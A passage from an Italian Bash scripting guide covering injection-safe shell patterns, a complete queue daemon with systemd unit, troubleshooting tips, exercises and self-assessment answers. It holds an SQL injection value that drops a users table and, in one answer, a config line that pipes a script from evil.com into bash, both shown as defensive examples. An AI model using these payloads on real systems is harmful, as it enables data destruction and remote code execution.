user="admin'; DROP TABLE users;--"
psql -c "SELECT * FROM users WHERE name='$user'"

# SICURO: variabile come parametro
psql -c "SELECT * FROM users WHERE name=\$1" --set=1="$user"
# oppure
psql -v name="$user" -c "SELECT * FROM users WHERE name=:'name'"

# ── Iniezione in find -exec ──────────────────────────────────────
# VULNERABILE:
find /data -name "$user_input" -exec rm {} \;

# SICURO: validare prima
if [[ "$user_input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    find /data -name "$user_input" -exec rm {} \;
fi

# ── Iniezione in ssh ─────────────────────────────────────────────
# VULNERABILE:
ssh server "echo $user_input"

# SICURO: usare -- e quotare
ssh server -- "echo $(printf '%q' "$user_input")"
# oppure passare via stdin
echo "$user_input" | ssh server 'cat'
```

### Permessi e Umask

```bash
#!/usr/bin/env bash
set -euo pipefail

# Impostare umask restrittiva all'inizio dello script
umask 077   # File: rw-------, directory: rwx------

# Verifica permessi di file sensibili
check_file_permissions() {
    local file="$1"
    local max_perms="${2:-600}"

    if [[ ! -f "$file" ]]; then
        echo "File non trovato: $file" >&2
        return 1
    fi

    local perms
    perms=$(stat -c '%a' "$file")

    # Verifica che non sia leggibile/scrivibile da altri
    if (( perms > max_perms )); then
        echo "ATTENZIONE: $file ha permessi $perms (massimo consentito: $max_perms)" >&2
        return 1
    fi
}

check_file_permissions "/etc/myapp/secrets.conf" 600
```

Riferimento: CWE-78 (OS Command Injection), CWE-377 (Insecure Temporary File).
https://cwe.mitre.org/data/definitions/78.html. Consultato: 2026-05-23.

---

## Progetto 4: Daemon Script

Un daemon è un processo che gira in background senza terminale associato, tipicamente gestito come servizio. Questo progetto implementa un daemon completo con: PID file, logging, signal handling, e health monitoring.

```bash
#!/usr/bin/env bash
#
# queue-daemon.sh — Daemon per elaborazione coda di task
#
# Legge file di task da una directory di input, li elabora,
# e li sposta in una directory di completamento o errore.
#
# Uso:
#   ./queue-daemon.sh start
#   ./queue-daemon.sh stop
#   ./queue-daemon.sh status
#   ./queue-daemon.sh reload
#
# Configurazione: /etc/queue-daemon/config.conf
#

set -euo pipefail

# ── Costanti ───────────────────────────────────────────────────────
readonly SCRIPT_NAME="$(basename "$0")"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly VERSION="1.0.0"

readonly DEFAULT_CONFIG="/etc/queue-daemon/config.conf"
readonly DEFAULT_PID_FILE="/var/run/queue-daemon.pid"
readonly DEFAULT_LOG_FILE="/var/log/queue-daemon.log"
readonly DEFAULT_QUEUE_DIR="/var/spool/queue-daemon"
readonly DEFAULT_POLL_INTERVAL=5
readonly DEFAULT_MAX_RETRIES=3

# ── Configurazione ────────────────────────────────────────────────
CONFIG_FILE="${QUEUE_DAEMON_CONFIG:-$DEFAULT_CONFIG}"
PID_FILE="$DEFAULT_PID_FILE"
LOG_FILE="$DEFAULT_LOG_FILE"
QUEUE_DIR="$DEFAULT_QUEUE_DIR"
POLL_INTERVAL="$DEFAULT_POLL_INTERVAL"
MAX_RETRIES="$DEFAULT_MAX_RETRIES"
WORKER_CMD=""

# ── Stato ──────────────────────────────────────────────────────────
RUNNING=true
RELOAD_REQUESTED=false
TASKS_PROCESSED=0
TASKS_FAILED=0

# ── Logging ────────────────────────────────────────────────────────
log() {
    local level="$1"
    shift
    printf '[%s] [%-5s] [PID %d] %s\n' \
        "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$level" $$ "$*" >> "$LOG_FILE"
}

# ── Gestione Configurazione ───────────────────────────────────────
load_config() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
        echo "Config non trovata: $CONFIG_FILE" >&2
        return 1
    fi

    while IFS='=' read -r key value; do
        key="${key%%#*}"
        key="${key// /}"
        [[ -z "$key" ]] && continue

        value="${value#"${value%%[![:space:]]*}"}"
        value="${value%"${value##*[![:space:]]}"}"
        value="${value#[\"\']}"
        value="${value%[\"\']}"

        case "$key" in
            pid_file)       PID_FILE="$value" ;;
            log_file)       LOG_FILE="$value" ;;
            queue_dir)      QUEUE_DIR="$value" ;;
            poll_interval)  POLL_INTERVAL="$value" ;;
            max_retries)    MAX_RETRIES="$value" ;;
            worker_cmd)     WORKER_CMD="$value" ;;
        esac
    done < "$CONFIG_FILE"

    # Validazione
    if [[ -z "$WORKER_CMD" ]]; then
        echo "Errore: worker_cmd non definito in $CONFIG_FILE" >&2
        return 1
    fi
}

# ── Signal Handling ────────────────────────────────────────────────
on_sigterm() {
    log INFO "SIGTERM ricevuto — avvio shutdown graceful"
    RUNNING=false
}

on_sighup() {
    log INFO "SIGHUP ricevuto — ricarica configurazione richiesta"
    RELOAD_REQUESTED=true
}

on_sigusr1() {
    log INFO "SIGUSR1 ricevuto — report stato"
    log INFO "Stato: processati=$TASKS_PROCESSED falliti=$TASKS_FAILED uptime=$(( SECONDS / 3600 ))h"
}

# ── PID File ───────────────────────────────────────────────────────
write_pid() {
    echo $$ > "$PID_FILE"
}

check_pid() {
    if [[ -f "$PID_FILE" ]]; then
        local old_pid
        old_pid=$(<"$PID_FILE")
        if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
            echo "Daemon già in esecuzione (PID $old_pid)" >&2
            return 1
        fi
        rm -f "$PID_FILE"
    fi
    return 0
}

remove_pid() {
    rm -f "$PID_FILE"
}

# ── Elaborazione Task ─────────────────────────────────────────────
process_task() {
    local task_file="$1"
    local task_name
    task_name="$(basename "$task_file")"
    local attempt=0
    local success=false

    while (( attempt < MAX_RETRIES )); do
        (( attempt++ ))
        log INFO "Elaborazione task: $task_name (tentativo $attempt/$MAX_RETRIES)"

        if bash -c "$WORKER_CMD" < "$task_file" >> "$LOG_FILE" 2>&1; then
            success=true
            break
        else
            log WARN "Task $task_name fallito al tentativo $attempt"
            sleep 1
        fi
    done

    if $success; then
        mv "$task_file" "$QUEUE_DIR/done/$task_name.$(date +%s)"
        (( TASKS_PROCESSED++ ))
        log INFO "Task $task_name completato con successo"
    else
        mv "$task_file" "$QUEUE_DIR/failed/$task_name.$(date +%s)"
        (( TASKS_FAILED++ ))
        log ERROR "Task $task_name fallito dopo $MAX_RETRIES tentativi"
    fi
}

# ── Loop Principale ───────────────────────────────────────────────
daemon_loop() {
    log INFO "Daemon avviato (PID $$, versione $VERSION)"
    log INFO "Queue dir: $QUEUE_DIR, poll: ${POLL_INTERVAL}s"

    while $RUNNING; do
        # Ricarica configurazione se richiesto
        if $RELOAD_REQUESTED; then
            log INFO "Ricarica configurazione in corso..."
            if load_config; then
                log INFO "Configurazione ricaricata con successo"
            else
                log ERROR "Errore nel ricaricamento — mantengo configurazione precedente"
            fi
            RELOAD_REQUESTED=false
        fi

        # Processa i task nella directory di input
        shopt -s nullglob
        local tasks=("$QUEUE_DIR"/incoming/*)
        shopt -u nullglob

        if (( ${#tasks[@]} > 0 )); then
            for task_file in "${tasks[@]}"; do
                [[ -f "$task_file" ]] || continue
                process_task "$task_file"

                # Controlla se è stato richiesto shutdown tra un task e l'altro
                $RUNNING || break
            done
        fi

        # Attendi prima del prossimo poll (interrompibile da segnali)
        if $RUNNING; then
            sleep "$POLL_INTERVAL" &
            wait $! 2>/dev/null || true
        fi
    done

    log INFO "Daemon terminato. Processati: $TASKS_PROCESSED, Falliti: $TASKS_FAILED"
}

# ── Daemonizzazione ───────────────────────────────────────────────
daemonize() {
    # Stacca dal terminale
    cd /
    exec > /dev/null
    exec 2> /dev/null
    exec < /dev/null

    # Doppio fork per evitare zombie
    (
        setsid bash -c "
            source '$SCRIPT_DIR/$SCRIPT_NAME'
            _run_daemon
        " &
    ) &
    disown

    echo "Daemon avviato in background"
}

_run_daemon() {
    trap on_sigterm SIGTERM SIGINT
    trap on_sighup  SIGHUP
    trap on_sigusr1 SIGUSR1
    trap remove_pid EXIT

    write_pid

    mkdir -p "$QUEUE_DIR"/{incoming,done,failed}

    daemon_loop
}

# ── Comandi ────────────────────────────────────────────────────────
cmd_start() {
    load_config
    check_pid || exit 1
    log INFO "Avvio daemon..."

    trap on_sigterm SIGTERM SIGINT
    trap on_sighup  SIGHUP
    trap on_sigusr1 SIGUSR1
    trap remove_pid EXIT

    write_pid
    mkdir -p "$QUEUE_DIR"/{incoming,done,failed}

    daemon_loop
}

cmd_stop() {
    if [[ ! -f "$PID_FILE" ]]; then
        echo "Daemon non in esecuzione (PID file non trovato)" >&2
        return 1
    fi

    local pid
    pid=$(<"$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
        echo "Invio SIGTERM al PID $pid..."
        kill -TERM "$pid"

        # Attendi terminazione con timeout
        local timeout=30
        local waited=0
        while kill -0 "$pid" 2>/dev/null && (( waited < timeout )); do
            sleep 1
            (( waited++ ))
        done

        if kill -0 "$pid" 2>/dev/null; then
            echo "Timeout — invio SIGKILL"
            kill -KILL "$pid" 2>/dev/null || true
        else
            echo "Daemon terminato con grazia"
        fi
    else
        echo "Processo $pid non trovato — pulizia PID file"
        rm -f "$PID_FILE"
    fi
}

cmd_status() {
    if [[ ! -f "$PID_FILE" ]]; then
        echo "Daemon: NON IN ESECUZIONE"
        return 1
    fi

    local pid
    pid=$(<"$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
        echo "Daemon: IN ESECUZIONE (PID $pid)"
        echo "Uptime: $(ps -o etime= -p "$pid" | xargs)"

        # Richiedi report stato
        kill -USR1 "$pid" 2>/dev/null
        echo "(Report di stato inviato — controllare $LOG_FILE)"
    else
        echo "Daemon: MORTO (PID file stale per PID $pid)"
        rm -f "$PID_FILE"
        return 1
    fi
}

cmd_reload() {
    if [[ ! -f "$PID_FILE" ]]; then
        echo "Daemon non in esecuzione" >&2
        return 1
    fi

    local pid
    pid=$(<"$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
        kill -HUP "$pid"
        echo "Segnale di ricarica inviato al PID $pid"
    else
        echo "Processo $pid non trovato" >&2
        return 1
    fi
}

# ── Main ───────────────────────────────────────────────────────────
main() {
    local cmd="${1:-help}"
    shift || true

    case "$cmd" in
        start)   cmd_start ;;
        stop)    cmd_stop ;;
        status)  cmd_status ;;
        reload)  cmd_reload ;;
        help|-h|--help)
            cat <<EOF
Uso: $SCRIPT_NAME {start|stop|status|reload|help}

  start    Avvia il daemon (foreground)
  stop     Arresta il daemon
  status   Mostra lo stato
  reload   Ricarica la configurazione (SIGHUP)
  help     Mostra questo messaggio
EOF
            ;;
        *)
            echo "Comando sconosciuto: $cmd" >&2
            exit 1
            ;;
    esac
}

main "$@"
```

File di configurazione del daemon:

```ini
# /etc/queue-daemon/config.conf
pid_file    = /var/run/queue-daemon.pid
log_file    = /var/log/queue-daemon.log
queue_dir   = /var/spool/queue-daemon
poll_interval = 5
max_retries = 3
worker_cmd  = /usr/local/bin/process-task.sh
```

Unit systemd per il daemon:

```ini
# /etc/systemd/system/queue-daemon.service
[Unit]
Description=Queue Processing Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/queue-daemon.sh start
ExecStop=/usr/local/sbin/queue-daemon.sh stop
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5
User=queue-daemon
Group=queue-daemon

[Install]
WantedBy=multi-user.target
```

---

## Troubleshooting

### Problema: Variabili modificate in un loop non persistono

**Sintomi**: Una variabile incrementata o modificata dentro un `while read` loop mantiene il valore originale dopo il loop.

**Causa**: L'uso di pipe (`|`) crea un subshell. Le variabili modificate nel subshell non sono visibili nella shell padre.

**Soluzione**: Usare process substitution o here string:

```bash
# ERRATO
count=0
cat file.txt | while read -r line; do (( count++ )); done
echo "$count"  # 0

# CORRETTO
count=0
while read -r line; do (( count++ )); done < <(cat file.txt)
echo "$count"  # valore corretto
```

### Problema: Script fallisce con "unbound variable"

**Sintomi**: Lo script termina con errore `bash: VAR: unbound variable` quando `set -u` è attivo.

**Causa**: Una variabile non è stata inizializzata prima dell'uso.

**Soluzione**: Usare valori default con `${VAR:-default}` o `${VAR:=default}`, oppure verificare con `[[ -v VAR ]]` prima dell'uso.

### Problema: Array associativo si comporta come indicizzato

**Sintomi**: Le chiavi stringa vengono interpretate come 0, tutte le assegnazioni sovrascrivono lo stesso elemento.

**Causa**: Manca `declare -A` prima dell'uso dell'array.

**Soluzione**: Dichiarare sempre l'array associativo con `declare -A nome_array` prima di qualsiasi assegnazione.

### Problema: Lo script non gestisce nomi di file con spazi

**Sintomi**: File come "my document.txt" vengono trattati come due argomenti separati.

**Causa**: Variabili o espansioni di array non quotate.

**Soluzione**: Quotare sempre: `"$file"`, `"${files[@]}"`. Usare `IFS= read -r` per leggere righe intere. Usare `-print0` con `find` e `read -d ''` per il NUL delimiter.

### Problema: trap EXIT non viene eseguito

**Sintomi**: Il cleanup definito con `trap cleanup EXIT` non viene eseguito quando lo script termina.

**Causa**: Lo script potrebbe essere stato terminato con `SIGKILL` (non intercettabile), oppure il trap è stato sovrascritto da un altro `trap` successivo, oppure si sta usando `exec` che sostituisce il processo.

**Soluzione**: Verificare che non ci siano `trap` multipli che si sovrascrivono. Per gestire più cleanup, usare una singola funzione che chiami tutti i cleanup necessari. Ricordare che `SIGKILL` non è mai intercettabile.

### Problema: `for f in $(ls)` spezza nomi con spazi

**Sintomi**: File come `"my document.txt"` vengono iterati come due parole separate (`my` e `document.txt`).

**Causa**: Word splitting sull'output di `$(ls)`.

**Soluzione**: Usare glob di shell, non `ls` in un for loop:

```bash
# ERRATO
for f in $(ls *.txt); do echo "$f"; done

# CORRETTO
for f in *.txt; do echo "$f"; done

# CORRETTO (con find, per ricorsione)
find . -name '*.txt' -print0 | while IFS= read -r -d '' f; do
    echo "$f"
done
```

### Problema: `[` vs `[[` — Comportamento inatteso con pattern

**Sintomi**: Il pattern matching funziona con `[[` ma non con `[`. Oppure uno script POSIX sh fallisce con `[[`.

**Causa**: `[` è un comando esterno (o built-in POSIX); `[[` è un costrutto Bash con semantica diversa.

**Soluzione**: Usare `[[ ]]` per script Bash; usare `[ ]` con `case` per script POSIX:

```bash
# Bash: [[ supporta ==, !=, =~, pattern glob
[[ "$var" == *.txt ]]    # OK in Bash
[ "$var" == *.txt ]      # BUG: glob expansion nel contesto sbagliato

# POSIX: usare case per pattern matching
case "$var" in *.txt) echo "match" ;; esac
```

### Problema: Aritmetica con zero iniziale (interpretata come ottale)

**Sintomi**: `$(( 08 + 1 ))` genera errore `value too great for base`.

**Causa**: Numeri con zero iniziale sono interpretati come ottale in Bash. `08` e `09` non sono validi in ottale.

**Soluzione**: Rimuovere lo zero iniziale con parameter expansion:

```bash
hour="08"
# ERRATO
result=$(( hour + 1 ))   # bash: 08: value too great for base (error token is "08")

# CORRETTO: forza base 10
result=$(( 10#$hour + 1 ))

# CORRETTO: rimuovi zero iniziale
hour="${hour#0}"
result=$(( hour + 1 ))
```

### Problema: Heredoc con TAB vs spazi

**Sintomi**: L'indentazione non viene rimossa dall'heredoc nonostante l'uso di `<<-`.

**Causa**: `<<-EOF` rimuove solo i TAB iniziali, non gli spazi. Editor configurati per inserire spazi al posto dei tab producono indentazione non rimovibile.

**Soluzione**: Usare TAB reali (non spazi) per l'indentazione all'interno di `<<-`:

```bash
# FUNZIONA: indentato con TAB reali
if true; then
	cat <<-EOF
	Questo testo è indentato con TAB.
	I TAB iniziali vengono rimossi.
	EOF
fi

# NON FUNZIONA: indentato con spazi
if true; then
    cat <<-EOF
    Questi spazi NON vengono rimossi.
    EOF
fi
```

### Problema: `local` maschera il codice di ritorno

**Sintomi**: Una funzione sembra riuscire anche quando il comando al suo interno fallisce.

**Causa**: `local var=$(cmd)` — il `local` restituisce sempre 0, mascherando l'exit code di `cmd`.

**Soluzione**: Separare dichiarazione e assegnazione:

```bash
# ERRATO: l'exit code di false_cmd è mascherato
myfunc() {
    local result=$(false_cmd)  # $? è 0 (successo di local), non l'exit code di false_cmd
}

# CORRETTO: separare local dalla command substitution
myfunc() {
    local result
    result=$(false_cmd)  # $? riflette l'exit code di false_cmd
}
```

### Problema: `set -e` non funziona dentro `if`

**Sintomi**: Un comando che fallisce dentro un blocco `if` non interrompe lo script nonostante `set -e`.

**Causa**: Per design, `set -e` è disabilitato in contesti condizionali (`if`, `while`, `&&`, `||`). Questo si propaga a tutte le funzioni chiamate in quel contesto.

**Soluzione**: Verificare l'exit code esplicitamente quando serve:

```bash
set -e

# set -e NON interrompe qui:
if critical_function; then
    echo "ok"
fi

# Se critical_function contiene altri comandi che possono fallire,
# quei fallimenti sono IGNORATI da set -e.

# Soluzione: controllare esplicitamente
critical_function
rc=$?
if (( rc == 0 )); then
    echo "ok"
else
    echo "fallito con codice $rc" >&2
    exit "$rc"
fi
```

### Problema: Glob expansion in variabili non quotate

**Sintomi**: Una variabile contenente `*` o `?` viene espansa come glob, producendo nomi di file inattesi.

**Causa**: Senza quoting, Bash applica pathname expansion al contenuto della variabile.

**Soluzione**: Quotare sempre le variabili:

```bash
msg="File: *.txt"

# ERRATO: stampa i nomi di tutti i file .txt nella directory corrente
echo $msg

# CORRETTO: stampa il letterale "File: *.txt"
echo "$msg"
```

### Problema: `read` perde il trailing newline o backslash

**Sintomi**: Righe lette con `read` perdono i backslash o l'ultima riga senza newline viene saltata.

**Causa**: `read` senza `-r` interpreta i backslash come escape. `read` restituisce non-zero a EOF anche se ha letto dati.

**Soluzione**: Usare sempre `read -r` e gestire l'ultima riga:

```bash
# ERRATO: perde backslash e ultima riga senza newline
while read line; do echo "$line"; done < file.txt

# CORRETTO
while IFS= read -r line || [[ -n "$line" ]]; do
    echo "$line"
done < file.txt
# IFS=     -> preserva whitespace iniziale/finale
# -r       -> non interpreta backslash
# || [[ -n "$line" ]]  -> processa l'ultima riga anche senza newline finale
```

### Problema: `$()` rimuove i newline finali

**Sintomi**: Il contenuto catturato con `$(cat file)` perde le righe vuote alla fine del file.

**Causa**: La command substitution `$()` in Bash rimuove sempre i newline finali (trailing).

**Soluzione**: Aggiungere un carattere sentinella e rimuoverlo dopo:

```bash
# Il file ha 3 righe vuote alla fine
content=$(cat file.txt; echo x)  # Aggiungi sentinella
content="${content%x}"            # Rimuovi sentinella
# Ora $content preserva i newline finali
```

### Problema: `kill -0` fallisce per permessi, non perché il processo è morto

**Sintomi**: `kill -0 $PID` restituisce errore per un processo che è ancora in esecuzione.

**Causa**: `kill -0` verifica se il processo esiste E se l'utente ha permesso di inviare segnali. Un utente non-root non può fare `kill -0` su un processo di un altro utente.

**Soluzione**: Verificare l'esistenza del processo con `/proc` o gestire entrambi i casi:

```bash
# Verifica più robusta dell'esistenza di un processo
process_exists() {
    local pid="$1"
    [[ -d "/proc/$pid" ]]
}

# Oppure: distinguere tra "non esiste" e "permesso negato"
if kill -0 "$pid" 2>/dev/null; then
    echo "Processo esistente e accessibile"
elif [[ -d "/proc/$pid" ]]; then
    echo "Processo esistente ma di un altro utente"
else
    echo "Processo non esistente"
fi
```

### Problema: TOCTOU (Time-of-Check-Time-of-Use) nei test su file

**Sintomi**: Lo script verifica che un file esista con `[[ -f file ]]`, poi lo usa, ma il file è stato cancellato o modificato nel frattempo.

**Causa**: Race condition: tra il check e l'uso, un altro processo può modificare lo stato.

**Soluzione**: Minimizzare la finestra tra check e uso, oppure gestire l'errore al momento dell'uso:

```bash
# VULNERABILE a TOCTOU
if [[ -f "$file" ]]; then
    # Un altro processo potrebbe cancellare $file qui
    cat "$file"  # Può fallire
fi

# ROBUSTO: gestisci l'errore al momento dell'uso
if content=$(<"$file" 2>/dev/null); then
    echo "$content"
else
    echo "Impossibile leggere $file" >&2
fi

# Per file temporanei: usa mktemp e non condividere il percorso
tmpfile="$(mktemp)"
echo "dati" > "$tmpfile"   # Solo questo processo conosce il nome
```

### Problema: Pipe in `set -o pipefail` fallisce con comandi legittimi

**Sintomi**: Lo script si interrompe su `cmd | head -1` perché `cmd` riceve SIGPIPE quando `head` chiude stdin.

**Causa**: Con `pipefail`, l'exit code 141 (128+13 SIGPIPE) di `cmd` viene propagato.

**Soluzione**: Gestire esplicitamente SIGPIPE o ignorare l'exit code in quel contesto:

```bash
set -euo pipefail

# PROBLEMA: seq riceve SIGPIPE quando head chiude
result=$(seq 1 1000000 | head -1)  # Exit code 141

# SOLUZIONE 1: sopprimere SIGPIPE per quel comando
result=$(seq 1 1000000 | head -1) || true

# SOLUZIONE 2: controllare PIPESTATUS
seq 1 1000000 | head -1
# Ignora solo SIGPIPE (141), non altri errori
if (( PIPESTATUS[0] != 0 && PIPESTATUS[0] != 141 )); then
    echo "Errore reale nel primo comando" >&2
fi
```

---

## Riferimenti

- **Bash Reference Manual (GNU)**: https://www.gnu.org/software/bash/manual/
- **POSIX Shell & Utilities**: https://pubs.opengroup.org/onlinepubs/9699919799/
- **Advanced Bash-Scripting Guide**: https://tldp.org/LDP/abs/html/
- **Google Shell Style Guide**: https://google.github.io/styleguide/shellguide.html
- **ShellCheck**: https://www.shellcheck.net/ — analisi statica per script shell
- **bashdb**: http://bashdb.sourceforge.net/ — debugger per Bash
- `man bash` — la reference definitiva
- `man 7 signal` — elenco completo dei segnali POSIX

---

## Esercizi

### Esercizio 1: File Watcher con Notifica

Scrivere uno script `file-watcher.sh` che:

1. Accetti come argomento una directory da monitorare e un comando da eseguire.
2. Utilizzi `inotifywait` (pacchetto `inotify-tools`) per rilevare creazione, modifica e cancellazione di file.
3. Per ogni evento, registri un log strutturato con timestamp ISO 8601, tipo di evento, e nome del file.
4. Se `inotifywait` non è disponibile, implementi un fallback basato su polling con `find -newer`.
5. Gestisca SIGTERM e SIGINT per shutdown graceful.
6. Utilizzi `flock` per impedire istanze multiple sullo stesso target.
7. Supporti le opzioni: `-d` (daemon mode), `-l FILE` (log file), `-i SEC` (poll interval per il fallback).

**Criteri di validazione**: lo script deve passare ShellCheck senza warning di severity `error` o `warning`. Deve funzionare con nomi di file contenenti spazi e caratteri speciali.

### Esercizio 2: Multi-Server Deployer

Scrivere uno script `deployer.sh` che:

1. Legga una lista di server da un file di configurazione (formato: `hostname role environment`).
2. Esegua in parallelo (massimo N job configurabile) un comando di deploy su ciascun server via SSH.
3. Raccolga i risultati (successo/fallimento/timeout) in un array associativo.
4. Produca un report finale con: server, stato, durata, output abbreviato.
5. In caso di fallimento su un server con `role=primary`, interrompa tutto e faccia rollback sugli altri.
6. Implementi retry con backoff esponenziale (1s, 2s, 4s) per fallimenti transitori.
7. Invii un riepilogo su syslog tramite `logger`.

**Criteri di validazione**: test con bats-core che verifichi il parsing del config, la logica di retry, e il report di output (usando mock per SSH).

### Esercizio 3: Log Aggregator con Named Pipe

Scrivere uno script `log-aggregator.sh` che:

1. Crei N named pipe (una per sorgente di log).
2. Avvii N processi in background che scrivono log simulati (formato syslog) sulle rispettive pipe.
3. Legga da tutte le pipe e aggreghi i messaggi in un unico file ordinato per timestamp.
4. Implementi filtraggio per severity (DEBUG, INFO, WARN, ERROR) configurabile a runtime tramite SIGUSR1/SIGUSR2.
5. Produca statistiche periodiche (ogni 60 secondi): messaggi per sorgente, per severity, rate medio.
6. Ruoti il file aggregato quando supera una dimensione configurabile.

**Criteri di validazione**: lo script deve gestire correttamente la chiusura di una sorgente senza bloccare le altre. Deve pulire tutte le named pipe all'uscita.

### Esercizio 4: Self-Testing Script

Scrivere uno script `toolkit.sh` che:

1. Esponga funzioni di utilità: `validate_ip`, `validate_email`, `format_bytes`, `parse_duration` (converte "2h30m" in secondi), `relative_time` (converte timestamp in "5 minuti fa").
2. Includa un sottocomando `test` che esegua una suite di test integrata (senza dipendenze esterne, usando solo funzioni helper interne).
3. Supporti l'opzione `--self-test` che esegua i test e esca con exit code 0 se tutti passano.
4. Sia importabile via `source` senza effetti collaterali (pattern guard: `if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then main "$@"; fi`).
5. Includa almeno 15 test case che coprano i casi limite: stringhe vuote, input Unicode, numeri negativi, overflow.

**Criteri di validazione**: `./toolkit.sh --self-test` deve uscire con 0. ShellCheck pulito. Ogni funzione deve avere un commento doc con firma e esempio.

---

## Auto-valutazione

### Domanda 1

Quale differenza pratica c'è tra `set -e` e `trap 'handler' ERR`? In quale caso `set -e` interrompe lo script ma il trap ERR non viene eseguito?

<details>
<summary>Risposta</summary>

`set -e` causa l'uscita immediata dello script quando un comando restituisce un exit code diverso da zero. `trap ERR` esegue una funzione handler quando un comando fallisce, ma lo script continua (a meno che l'handler non chiami `exit`).

La differenza critica: se si usa `set -e` senza `set -E` (o `set -eE`), il trap ERR **non** viene eseguito nelle funzioni. Il flag `-E` (`errtrace`) è necessario per propagare il trap ERR all'interno di funzioni e subshell.

Inoltre, `set -e` **non interrompe** in contesti condizionali (`if cmd`, `cmd && ...`, `cmd || ...`), e in quei contesti anche il trap ERR non viene attivato. Tuttavia, se un comando fallisce durante una command substitution non protetta e `shopt -s inherit_errexit` è attivo (Bash 4.4+), `set -e` interrompe ma il trap ERR potrebbe non essere invocato nella subshell se `-E` non è impostato.

Riferimento: Bash Reference Manual, sezione 4.3.1 «The Set Builtin», flag `-e` e `-E`. Consultato: 2026-05-23.
</details>

### Domanda 2

Perché `local result=$(false_command)` restituisce exit code 0 anche se `false_command` fallisce?

<details>
<summary>Risposta</summary>

Il built-in `local` è un comando a sé stante. La sua esecuzione (dichiarare una variabile locale) riesce sempre (exit code 0), e questo exit code sovrascrive quello della command substitution.

Separare dichiarazione e assegnazione risolve il problema:

```bash
local result
result=$(false_command)   # Ora $? riflette l'exit code di false_command
```

Questo comportamento è documentato nel Bash Reference Manual: «the return status [of local] is zero unless local is used outside a function, an invalid name is supplied, or name is a readonly variable.»

Riferimento: Bash Reference Manual, sezione 4.2 «Bash Builtin Commands», descrizione di `local`. Consultato: 2026-05-23.
</details>

### Domanda 3

Spiegare perché `echo "$(cat file.txt)"` e `cat file.txt` possono produrre output diverso. Quali caratteri vengono persi e come preservarli?

<details>
<summary>Risposta</summary>

La command substitution `$(...)` rimuove sempre tutti i newline finali (trailing newlines) dall'output del comando. Se `file.txt` termina con una o più righe vuote, queste vengono perse.

Esempio: un file con contenuto `"hello\n\n\n"` (tre newline finali) diventa `"hello"` dentro `$()`.

Per preservare i newline finali, si aggiunge un carattere sentinella:

```bash
content=$(cat file.txt; echo x)
content="${content%x}"
printf '%s' "$content"
```

Inoltre, `echo` aggiunge un newline di suo, quindi `echo "$(cat file.txt)"` aggiunge un newline che non c'era necessariamente nell'originale.

Riferimento: POSIX.1-2024, sezione 2.6.3 «Command Substitution»: «the shell shall remove sequences of one or more <newline> characters at the end of the substitution.» Consultato: 2026-05-23.
</details>

### Domanda 4

Qual è la differenza tra `flock` e un PID file per il mutual exclusion? In quale scenario un PID file può fallire anche se implementato correttamente?

<details>
<summary>Risposta</summary>

`flock` utilizza i lock advisory del kernel, che sono atomici e vengono rilasciati automaticamente quando il file descriptor viene chiuso — anche in caso di crash, SIGKILL o power failure. Non c'è mai un "lock stale".

Un PID file scrive il PID del processo nel file e lo verifica all'avvio. È vulnerabile a:

1. **Race condition (TOCTOU)**: due istanze possono verificare contemporaneamente che il PID file non esiste, entrambe scrivono il proprio PID, e una sovrascrive l'altra.
2. **Stale lock**: se il processo muore senza pulire il PID file (SIGKILL, crash, power failure), il lock rimane e le istanze successive lo trovano presente. Si può mitigare con `kill -0 $PID`, ma il PID potrebbe essere stato riutilizzato da un altro processo.
3. **PID recycling**: su sistemi con uptime lungo, il PID del processo morto può essere riassegnato a un processo non correlato, causando un falso positivo su `kill -0`.

`flock` è superiore in tutti questi scenari ed è la scelta raccomandata su Linux.

Riferimento: `man flock`, `man 2 flock`. Consultato: 2026-05-23.
</details>

### Domanda 5

Qual è il rischio di sicurezza nel fare `source /path/to/config.conf` per caricare configurazione? Come si mitiga?

<details>
<summary>Risposta</summary>

`source` (o `.`) esegue il contenuto del file come codice Bash nel contesto della shell corrente. Un file di configurazione compromesso (o con permessi errati che permettono la modifica da parte di un altro utente) può contenere codice arbitrario:

```ini
# config.conf — apparentemente innocuo
DB_HOST=localhost
DB_PORT=5432
# Ma un attaccante potrebbe inserire:
$(curl http://evil.com/backdoor.sh | bash)
```

Mitigazioni:

1. **Parsing manuale**: leggere il file riga per riga e validare chiave=valore con whitelist delle chiavi ammesse.
2. **Verifica permessi**: il file deve essere owned da root (o dall'utente dello script) e non world-writable.
3. **Verifica integrità**: hash SHA-256 del file config verificato prima del caricamento.
4. **Contesto ristretto**: se si deve usare `source`, farlo in una subshell `(source file; echo "$VAR")` per limitare l'effetto di codice malevolo — ma questo non previene effetti collaterali come connessioni di rete.
5. **SELinux/AppArmor**: confinare il processo dello script per limitare le azioni possibili.

Riferimento: CWE-94 (Improper Control of Generation of Code — Code Injection). Consultato: 2026-05-23.
</details>

### Domanda 6

In che modo `shopt -s inherit_errexit` cambia il comportamento di `set -e` nelle subshell create da command substitution? Fornire un esempio concreto.

<details>
<summary>Risposta</summary>

Senza `inherit_errexit`, le subshell create da `$()` non ereditano l'opzione `errexit`, anche se lo script padre ha `set -e`:

```bash
set -e
result=$(
    echo "prima"
    false          # NON interrompe la subshell — errexit non ereditato
    echo "dopo"    # Viene eseguito
)
echo "result=$result"  # Stampa: result=prima\ndopo
```

Con `shopt -s inherit_errexit` (disponibile da Bash 4.4):

```bash
set -e
shopt -s inherit_errexit
result=$(
    echo "prima"
    false          # INTERROMPE la subshell — errexit ereditato
    echo "dopo"    # NON viene eseguito
)
# Lo script si interrompe qui perché la subshell è fallita
echo "non raggiunto"
```

Questa opzione è essenziale per il defensive scripting: senza di essa, errori nelle command substitution passano inosservati nonostante `set -e`.

Riferimento: Bash Reference Manual, sezione 4.3.2 «The Shopt Builtin», descrizione di `inherit_errexit`. Introdotto in Bash 4.4 (settembre 2016). Consultato: 2026-05-23.
</details>

### Domanda 7

